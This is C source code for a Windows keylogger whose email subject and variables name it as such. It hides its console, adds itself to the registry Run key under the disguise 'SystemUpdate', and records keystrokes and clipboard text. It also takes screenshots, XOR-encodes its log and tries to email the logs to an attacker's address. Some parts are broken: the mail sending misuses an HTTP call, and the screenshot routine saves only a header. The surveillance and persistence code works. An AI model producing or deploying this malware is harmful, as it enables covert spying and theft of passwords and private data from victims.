#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <wininet.h>
#include <conio.h>
#include <sys/stat.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "wininet.lib")

#define LOG_FILE "dataStore.dat"
#define EMAIL_INTERVAL 300
#define LOG_SIZE_LIMIT 10000

// Gmail SMTP 
char mailServer[] = "smtp.gmail.com";
char attackerEmail[] = "your_attacker_email@gmail.com";
char senderEmail[] = "your_email@gmail.com"; 
char emailPassword[] = "your_email_password"; 

void disguise() {
    FreeConsole();
}

int storeKeyStrokes(int key, FILE *file) {
    if (key == 1 || key == 2) {
        return 0;
    }
    fprintf(file, "%c", key);
    return 0;
}

void logKeyPresses() {
    FILE *file;
    file = fopen(LOG_FILE, "a+");
    while (1) {
        for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                storeKeyStrokes(i, file);
            }
        }
        fflush(file);
        Sleep(10);
    }
    fclose(file);
}

// Update SMTP
void sendLogsSMTP() {
    FILE *logFile;
    char dataBuffer[512];
    DWORD dwBytesRead;
    HINTERNET hInternet = InternetOpen("Microsoft Internet Explorer", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return;

    HINTERNET hConnect = InternetConnect(hInternet, mailServer, INTERNET_DEFAULT_SMTP_PORT, NULL, NULL, INTERNET_SERVICE_SMTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return;
    }

    while (1) {
        logFile = fopen(LOG_FILE, "r");
        if (logFile == NULL) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return;
        }
        
        while ((dwBytesRead = fread(dataBuffer, 1, sizeof(dataBuffer) - 1, logFile)) > 0) {
            dataBuffer[dwBytesRead] = '\0';

            
            char emailContent[1024];
            sprintf(emailContent, "From: %s\r\nTo: %s\r\nSubject: Keylogger Logs\r\n\r\n%s", senderEmail, attackerEmail, dataBuffer);

            
            if (HttpSendRequest(hConnect, "POST /send-email", strlen(emailContent), emailContent, strlen(emailContent))) {
                printf("Email sent successfully!\n");
            } else {
                printf("Failed to send email.\n");
            }
        }

        fclose(logFile);
        
  
        remove(LOG_FILE);

        Sleep(EMAIL_INTERVAL * 1000);
    }
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

void captureScreenshot() {
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetDC(hwnd);
    HDC hDest = CreateCompatibleDC(hdc);
    RECT rc;
    GetClientRect(hwnd, &rc);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdc, rc.right, rc.bottom);
    SelectObject(hDest, hBitmap);
    BitBlt(hDest, 0, 0, rc.right, rc.bottom, hdc, 0, 0, SRCCOPY);
    BITMAPINFOHEADER bi = { sizeof(bi), rc.right, rc.bottom, 1, 32, BI_RGB };
    GetDIBits(hdc, hBitmap, 0, rc.bottom, NULL, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    
    char screenshotFile[64];
    sprintf(screenshotFile, "img_%ld.bmp", time(NULL));
    FILE *file = fopen(screenshotFile, "wb");
    fwrite(&bi, sizeof(bi), 1, file);
    fclose(file);
    DeleteObject(hBitmap);
    DeleteDC(hDest);
    ReleaseDC(hwnd, hdc);
}

void logClipboardData() {
    if (!OpenClipboard(NULL)) return;
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == NULL) {
        CloseClipboard();
        return;
    }
    char *clipboardData = (char*)GlobalLock(hData);
    FILE *file = fopen(LOG_FILE, "a+");
    if (file != NULL) {
        fprintf(file, "\n[Clipboard]: %s\n", clipboardData);
        fclose(file);
    }
    GlobalUnlock(hData);
    CloseClipboard();
}

void autoStart() {
    HKEY hKey;
    const char *keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char *value = "SystemUpdate";
    const char *exePath = "C:\\path\\to\\your\\executable.exe";
    if (RegOpenKey(HKEY_CURRENT_USER, keyPath, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, value, 0, REG_SZ, (LPBYTE)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
    }
}

void splitLogFile() {
    struct stat st;
    if (stat(LOG_FILE, &st) == 0 && st.st_size > LOG_SIZE_LIMIT) {
        char newFileName[64];
        sprintf(newFileName, "dataStore_%ld.dat", time(NULL));
        rename(LOG_FILE, newFileName);
    }
}

void encryptLogFile() {
    FILE *file = fopen(LOG_FILE, "rb");
    if (!file) return;
    FILE *encryptedFile = fopen("encrypted.dat", "wb");
    int c;
    while ((c = fgetc(file)) != EOF) {
        fputc(c ^ 0xAA, encryptedFile);
    }
    fclose(file);
    fclose(encryptedFile);
}

int main() {
    disguise();
    autoStart();
    HANDLE thread1 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)logKeyPresses, NULL, 0, NULL);
    HANDLE thread2 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sendLogsSMTP, NULL, 0, NULL);
    while (1) {
        captureScreenshot();
        logClipboardData();
        splitLogFile();
        encryptLogFile();
        Sleep(EMAIL_INTERVAL * 1000);
    }
    WaitForSingleObject(thread1, INFINITE);
    WaitForSingleObject(thread2, INFINITE);
    return 0;
}
